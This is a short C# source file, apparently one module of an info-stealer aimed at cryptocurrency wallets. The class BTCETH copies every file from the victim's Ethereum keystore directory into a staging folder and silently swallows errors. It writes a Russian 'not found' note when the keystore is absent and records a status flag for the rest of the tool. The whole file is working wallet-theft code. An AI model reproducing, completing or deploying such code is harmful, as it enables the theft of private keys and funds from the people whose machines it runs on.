using System.IO;

internal class BTCETH
{
	public static void Start()
	{
		string text = $"{Buffer.path_l}BTC-Ethereum";
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string path = $"{Buffer.path_ad}Ethereum\\keystore";
			if (Directory.Exists(path))
			{
				FileInfo[] files = new DirectoryInfo(path).GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					fileInfo.CopyTo(text + "\\" + fileInfo.Name, overwrite: true);
				}
			}
		}
		catch
		{
		}
		if (Directory.GetFiles(text).Length == 0)
		{
			File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Ethereum не найден на компьютере.");
			Buffer.XBufferData[15] = "0";
		}
		else
		{
			Buffer.XBufferData[15] = "1";
		}
	}
}
